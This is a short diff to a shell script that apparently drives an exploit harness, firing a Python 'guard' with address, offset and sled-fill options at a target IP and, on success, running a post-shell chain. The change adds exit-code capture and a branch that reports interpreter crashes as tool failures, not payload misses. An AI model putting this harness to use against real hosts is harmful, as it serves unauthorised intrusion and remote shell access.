@@ -92,6 +92,7 @@ echo "fired $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
 out="$( "$PY" "$GUARD" guard --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
         --count 1 --sledfill --padpc 1 --pcround 0x1000 \
         --guard-deadline 0 --guard-gap "$GUARD_GAP" 2>&1 )"
+rc=$?
 printf '%s\n' "$out" >> "$LOG"
 [ -t 1 ] && printf '%s\n' "$out"
 
@@ -102,6 +103,15 @@ case "$out" in
     "$POSTSHELL" "$ip" && exit 0
     log "post-shell chain FAILED (see /tmp/pane1/$ip)"
     exit 0
+    ;;
+  # A crash is NOT a payload miss: nothing was sent, the address is not in doubt, and sweeping
+  # would be the wrong response. Measured 2026-11-03: the guard died at import on `/usr/bin/python3`
+  # (3.9, the interpreter launchd actually resolves) over PEP 604 annotations, and the shot was
+  # reported as a decode-buffer miss.
+  *"Traceback (most recent call last)"*|*"SyntaxError"*|*"TypeError"*)
+    log "GUARD CRASHED (rc=$rc) before a usable verdict — not a payload miss; fix the guard, then FORCE=1"
+    echo "crash $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
+    exit 1
     ;;
 esac
 
